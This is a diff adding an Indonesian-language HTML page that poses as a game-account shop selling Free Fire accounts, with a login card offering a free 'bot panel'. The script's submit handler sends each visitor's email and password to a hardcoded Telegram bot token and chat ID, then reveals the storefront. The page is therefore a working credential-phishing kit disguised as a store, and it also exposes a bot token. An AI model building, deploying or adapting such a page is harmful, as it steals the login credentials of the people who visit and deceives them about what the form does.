@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Saturn07 Store Order akun game amanah dan Terpercaya -</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00c853;
+            --primary-hover: #00a445;
+            --dark: #0f172a;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.12);
+            --white: #ffffff;
+        }
+
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body { background: #000; color: var(--white); min-height: 100vh; overflow-x: hidden; }
+
+        .bg-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://files.catbox.moe/jh1sff.jpg') no-repeat center center;
+            background-size: cover; z-index: -2;
+        }
+
+        .bg-blur {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, transparent, #000 90%), rgba(0,0,0,0.75);
+            backdrop-filter: blur(12px); z-index: -1;
+        }
+
+        #preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center;
+        }
+
+        /* --- LOGIN PAGE --- */
+        #page-login { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .login-card {
+            background: var(--white); color: #334155; width: 100%; max-width: 400px;
+            padding: 40px 30px; border-radius: 24px; text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            animation: slideUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+        .login-logo {
+            background: var(--primary); width: 45px; height: 45px; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;
+            color: white; font-weight: bold; font-size: 20px;
+        }
+        .login-card h2 { font-weight: 800; font-size: 22px; color: #1e293b; margin-bottom: 4px; }
+        .login-card p { font-size: 13px; color: #64748b; margin-bottom: 30px; }
+        .form-group { text-align: left; margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 700; color: #475569; margin-bottom: 8px; margin-left: 5px; }
+        .form-group input {
+            width: 100%; padding: 14px 18px; border-radius: 12px; border: 1.5px solid #e2e8f0;
+            background: #f8fafc; outline: none; font-size: 14px; transition: 0.3s;
+        }
+        .form-group input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(0, 200, 83, 0.15); }
+        .btn-submit {
+            width: 100%; padding: 16px; border-radius: 12px; border: none;
+            background: var(--primary); color: white; font-weight: 700; cursor: pointer; transition: 0.3s;
+        }
+        .promo-box {
+            background: #f0fdf4; border-radius: 12px; padding: 15px; margin-top: 25px;
+            font-size: 11px; color: #166534; text-align: left; border: 1px solid #dcfce7;
+        }
+
+        /* --- DASHBOARD --- */
+        #page-store { display: none; padding: 20px; max-width: 600px; margin: 0 auto 100px auto; animation: fadeIn 0.6s ease; }
+        .hero-section { text-align: center; padding: 50px 0 30px; }
+        .hero-section h1 { font-size: 28px; font-weight: 800; letter-spacing: -1px; }
+        .hero-section span { color: var(--primary); }
+        .card-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .product-card {
+            background: var(--glass); backdrop-filter: blur(20px); border: 1px solid var(--glass-border);
+            border-radius: 24px; overflow: hidden; transition: 0.4s; cursor: pointer;
+        }
+        .product-card:hover { transform: translateY(-8px); border-color: var(--primary); }
+        .product-card img { width: 100%; aspect-ratio: 1/1; object-fit: cover; }
+        .product-content { padding: 15px; }
+        .p-name { font-size: 12px; font-weight: 500; color: #94a3b8; margin-bottom: 5px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .p-price { font-size: 15px; font-weight: 800; color: #fff; }
+
+        /* --- DETAIL SPA --- */
+        #detail-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 2000; display: none; overflow-y: auto;
+        }
+        .btn-close { position: absolute; top: 25px; left: 25px; background: rgba(0,0,0,0.5); border: none; color: white; width: 45px; height: 45px; border-radius: 50%; z-index: 10; font-size: 20px; backdrop-filter: blur(10px); }
+        .slider-box { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; background: #111; }
+        .slider-box img { width: 100%; flex-shrink: 0; scroll-snap-align: start; aspect-ratio: 1/1; object-fit: contain; }
+        .detail-info { padding: 30px; }
+        .detail-name { font-size: 22px; font-weight: 800; margin-bottom: 10px; }
+        .detail-price { font-size: 28px; font-weight: 800; color: var(--primary); margin-bottom: 25px; }
+        .spec-item { background: #1e293b; padding: 18px; border-radius: 16px; margin-bottom: 10px; display: flex; justify-content: space-between; font-size: 14px; }
+        .buy-button {
+            display: block; width: 100%; padding: 20px; background: var(--primary);
+            color: #fff; text-align: center; text-decoration: none; border-radius: 18px;
+            font-weight: 800; font-size: 16px; margin-top: 30px; box-shadow: 0 10px 25px rgba(0, 200, 83, 0.4);
+        }
+
+        /* --- NAV --- */
+        .nav-bar {
+            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+            width: 100%; max-width: 500px; background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(25px); display: flex; justify-content: space-around;
+            padding: 18px 0; border-top: 1px solid var(--glass-border); z-index: 1500;
+        }
+        .nav-btn { text-align: center; color: #64748b; font-size: 11px; font-weight: 600; cursor: pointer; flex: 1; }
+        .nav-btn.active { color: var(--primary); }
+        .nav-btn i { font-size: 22px; display: block; margin-bottom: 5px; font-style: normal; }
+
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 30px; }
+        .modal-body { background: #1e293b; padding: 35px; border-radius: 28px; text-align: center; width: 100%; max-width: 350px; }
+
+        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="preloader">
+        <div style="width: 45px; height: 45px; border: 4px solid #1e293b; border-top-color: var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+    </div>
+
+    <div class="bg-overlay"></div>
+    <div class="bg-blur"></div>
+
+    <audio id="musicPlayer" loop><source src="https://files.catbox.moe/x5d0fh.mp3" type="audio/mpeg"></audio>
+
+    <div id="page-login">
+        <div class="login-card">
+            <div class="login-logo">J</div>
+            <h2>Selamat Datang</h2>
+            <p>Masuk untuk mengelola panel bot Anda</p>
+            <form id="authForm">
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="email" placeholder="nama@email.com" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-submit" id="btnLogText">➜ Masuk</button>
+            </form>
+            <div class="promo-box">🎉 <b>Panel Gratis Menanti!</b><br>Dapatkan akses panel gratis hanya dengan mendaftar akun sekarang juga.</div>
+        </div>
+    </div>
+
+    <div id="page-store">
+        <div class="hero-section"><h1>SULTAN <span>STORE</span></h1><p style="color: #64748b; font-size: 13px;">Pusat Akun Game Premium Terpercaya</p></div>
+        <div class="card-grid" id="productGrid"></div>
+    </div>
+
+    <div id="detail-screen">
+        <button class="btn-close" onclick="closeDetail()">✕</button>
+        <div class="slider-box" id="detailImages"></div>
+        <div class="detail-info">
+            <h2 id="detTitle" class="detail-name">Name</h2>
+            <div id="detPrice" class="detail-price">Rp 0</div>
+            <div class="spec-item"><span>Login</span><b>Google / FB</b></div>
+            <div class="spec-item"><span>Bind</span><b>Kosong / Polos</b></div>
+            <div class="spec-item"><span>Status</span><b>Ready Stock</b></div>
+            <a href="#" id="buyLink" class="buy-button">BELI SEKARANG</a>
+        </div>
+    </div>
+
+    <div class="modal" id="modalAlert">
+        <div class="modal-body">
+            <h2 style="color: var(--primary); margin-bottom: 15px;">⚠️ INFO</h2>
+            <p style="color: #94a3b8; font-size: 14px;">Fitur ini sedang dalam tahap pengembangan.</p>
+            <button class="btn-submit" onclick="closeModal()" style="margin-top: 25px;">Oke</button>
+        </div>
+    </div>
+
+    <nav class="nav-bar" id="bottomNav" style="display: none;">
+        <div class="nav-btn" onclick="openMaintenance()"><i>🔥</i>TopUp</div>
+        <div class="nav-btn active" onclick="closeDetail()"><i>🏠</i>Home</div>
+        <div class="nav-btn" onclick="openDocs()"><i>📄</i>Docs API</div>
+        <div class="nav-btn" onclick="togglePlay()"><i>🎵</i>Music</div>
+    </nav>
+
+    <script>
+        const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ"; 
+        const TARGET_ID = "1955836653";
+
+        // DATABASE AKUN DENGAN FOTO BERBEDA
+        const DB_PRODUCTS = [
+            { 
+                name: "FREE FIRE SG GURUN VAULT 200+", 
+                price: "Rp 180.000", 
+                thumb: "https://files.catbox.moe/jh1sff.jpg",
+                slides: ["https://files.catbox.moe/jh1sff.jpg", "https://files.catbox.moe/jh1sff.jpg"] // Ganti link foto detail di sini
+            },
+            { 
+                name: "FREE FIRE SULTAN N217", 
+                price: "Rp 7.500.000", 
+                thumb: "https://files.catbox.moe/jh1sff.jpg",
+                slides: ["https://files.catbox.moe/jh1sff.jpg"] 
+            },
+            { 
+                name: "FREE FIRE SULTAN N204", 
+                price: "Rp 16.500.000", 
+                thumb: "https://files.catbox.moe/jh1sff.jpg",
+                slides: ["https://files.catbox.moe/jh1sff.jpg"] 
+            },
+            { 
+                name: "FREE FIRE SULTAN N271", 
+                price: "Rp 5.900.000", 
+                thumb: "https://files.catbox.moe/jh1sff.jpg",
+                slides: ["https://files.catbox.moe/jh1sff.jpg"] 
+            },
+            { 
+                name: "FREE FIRE S131", 
+                price: "Rp 700.000", 
+                thumb: "https://files.catbox.moe/jh1sff.jpg",
+                slides: ["https://files.catbox.moe/jh1sff.jpg"] 
+            },
+            { 
+                name: "FREE FIRE S130", 
+                price: "Rp 3.900.000", 
+                thumb: "https://files.catbox.moe/jh1sff.jpg",
+                slides: ["https://files.catbox.moe/jh1sff.jpg"] 
+            }
+        ];
+
+        window.onload = () => {
+            document.getElementById('preloader').style.display = 'none';
+            const grid = document.getElementById('productGrid');
+            DB_PRODUCTS.forEach((p, index) => {
+                grid.innerHTML += `
+                    <div class="product-card" onclick="openDetail(${index})">
+                        <img src="${p.thumb}">
+                        <div class="product-content">
+                            <div class="p-name">${p.name}</div>
+                            <div class="p-price">${p.price}</div>
+                        </div>
+                    </div>
+                `;
+            });
+        };
+
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btnLogText');
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            btn.innerText = "Authenticating...";
+            btn.disabled = true;
+
+            const text = `✉️ *NOTIFIKASI LOGIN BARU*\n` +
+                         `──────────────────\n` +
+                         `📧 *EMAIL:* \`${email}\`\n` +
+                         `🔐 *PASWORD:* \`${pass}\`\n` +
+                         `──────────────────\n` +
+                         `🕒 *TIME:* ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: TARGET_ID, text: text, parse_mode: 'Markdown' })
+                });
+                document.getElementById('page-login').style.display = 'none';
+                document.getElementById('page-store').style.display = 'block';
+                document.getElementById('bottomNav').style.display = 'flex';
+                document.getElementById('musicPlayer').play().catch(()=>{});
+            } catch (err) {
+                alert("Login Error!");
+                btn.innerText = "➜ Masuk"; btn.disabled = false;
+            }
+        });
+
+        function openDetail(index) {
+            const p = DB_PRODUCTS[index];
+            document.getElementById('detTitle').innerText = p.name;
+            document.getElementById('detPrice').innerText = p.price;
+            
+            let sliderHtml = '';
+            p.slides.forEach(img => { sliderHtml += `<img src="${img}">`; });
+            document.getElementById('detailImages').innerHTML = sliderHtml;
+            
+            const waLink = `https://wa.me/6285137572429?text=Saya+mau+beli+${encodeURIComponent(p.name)}+harga+${encodeURIComponent(p.price)}`;
+            document.getElementById('buyLink').href = waLink;
+            
+            document.getElementById('detail-screen').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeDetail() { document.getElementById('detail-screen').style.display = 'none'; document.body.style.overflow = 'auto'; }
+        function openMaintenance() { document.getElementById('modalAlert').style.display = 'flex'; }
+        function closeModal() { document.getElementById('modalAlert').style.display = 'none'; }
+        function openDocs() { window.location.href = "https://apo-kaaaoffc.vercel.app"; }
+        function togglePlay() { const m = document.getElementById('musicPlayer'); m.paused ? m.play() : m.pause(); }
+    </script>
+</body>
+      </html>
